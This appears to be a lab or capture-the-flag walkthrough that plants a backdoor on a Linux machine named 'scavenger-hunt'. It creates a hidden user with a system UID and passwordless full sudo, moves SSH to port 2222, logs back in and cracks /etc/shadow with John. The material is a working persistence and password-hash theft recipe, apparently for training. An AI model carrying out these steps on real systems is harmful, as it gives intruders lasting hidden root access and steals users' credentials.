Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
Useradd sysd
Give your secret user a password:
passwd sysd
Give your secret user a system UID < 1000:
usermod -u 998 sysd
Give your secret user the same GID:
groupmod -g 998 sysd
Give your secret user full sudo access without the need for a password:
Sudo visudo  sysd	ALL=(ALL:ALL) NOPASSWD:ALL
Test that sudo access works without your password:
Sudo -l

 Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysd may run the following commands on scavenger-hunt:
    (ALL : ALL) NOPASSWD: ALL

Step 2: Smooth Sailing
Edit the sshd_config file: 
Sudo nano /etc/ssh/sshd_config
Step 3: Testing Your Configuration Update
Restart the SSH service:
Systemctl restart ssh
Exit the root account:
exit
SSH to the target machine using your sysd account and port 2222:
ssh sysd@192.168.6.105 -p 2222
Use sudo to switch to the root user:
Sudo -s
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
Ssh sysd@192.168.6.105 -p 2222
Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
Sudo su
John /etc/shadow
